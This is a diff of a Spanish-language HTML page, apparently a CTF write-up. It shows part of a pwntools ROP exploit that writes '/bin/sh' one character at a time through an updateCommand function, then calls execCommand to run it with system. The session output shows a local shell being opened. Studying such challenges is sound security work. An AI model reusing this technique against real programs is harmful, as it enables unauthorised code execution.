-<p class="plain-text">El exploit final llena caracter por caracter llamando a la función <code class="language-plaintext highlighter-rouge">updateCommand</code> la variable <code class="language-plaintext highlighter-rouge">command</code> con la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> y cuando termina el bucle llama a la función <code class="language-plaintext highlighter-rouge">execCommand</code> que ejecuta la variable <code class="language-plaintext highlighter-rouge">command</code> con <code class="language-plaintext highlighter-rouge">system</code> y devuelve la shell</p>
+<p class="plain-text">El exploit final llena caracter por caracter llamando a la función <code class="language-plaintext highlighter-rouge">updateCommand</code> la variable <code class="language-plaintext highlighter-rouge">command</code> con la cadena <code class="language-plaintext highlighter-rouge">/bin/sh</code> y cuando termina el bucle llama a la función <code class="language-plaintext highlighter-rouge">execCommand</code> que ejecuta la variable <code class="language-plaintext highlighter-rouge">command</code> con <code class="language-plaintext highlighter-rouge">system</code> y devuelve la shell.</p>
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="c1">#!/usr/bin/python3
 </span><span class="o">from</span><span class="p"> pwn</span><span class="o"> import</span><span class="p"> process, p32, u8
@@ -445,7 +444,7 @@ payload</span><span class="o"> +=</span><span class="p"> junk
 
 </span><span class="o">for</span><span class="p"> i </span><span class="o">in</span><span class="no"> range</span><span class="p">(</span><span class="no">len</span><span class="p">(cmd)):
     payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x80491f3</span><span class="p">)</span><span class="c1">      # updateCommand()</span><span class="p">
-    payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x804901b</span><span class="p">)</span><span class="c1">      # add esp 8; pop ebx; ret;</span><span class="p">  
+    payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x804901b</span><span class="p">)</span><span class="c1">      # add esp 8; pop ebx; ret;</span><span class="p">
     payload</span><span class="o"> +=</span><span class="p"> p32(i)</span><span class="c1">              # position</span><span class="p">
     payload</span><span class="o"> +=</span><span class="p"> p32(u8(cmd[i:i</span><span class="o">+</span><span class="mi">1</span><span class="p">]))</span><span class="c1"> # character</span><span class="p">
     payload</span><span class="o"> +=</span><span class="p"> p32(</span><span class="mi">0x41414141</span><span class="p">)</span><span class="c1">     # padding for pop</span><span class="p">
@@ -458,7 +457,7 @@ shell.interactive()</span>
 
 <div class="language-python highlighter-rouge contenedor"><div class="highlight"><pre class="highlight">
 <code><span class="ve">❯ python3 </span><span class="p">exploit.py
-[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 305681  
+[</span><span class="ve">+</span><span class="p">] Starting local process './chal': pid 305681
 [</span><span class="az">*</span><span class="p">] Switching to interactive mode
 </span><span class="ro">$ </span><span class="p">id
 uid=1000(user) gid=1000(user) groups=1000(user)
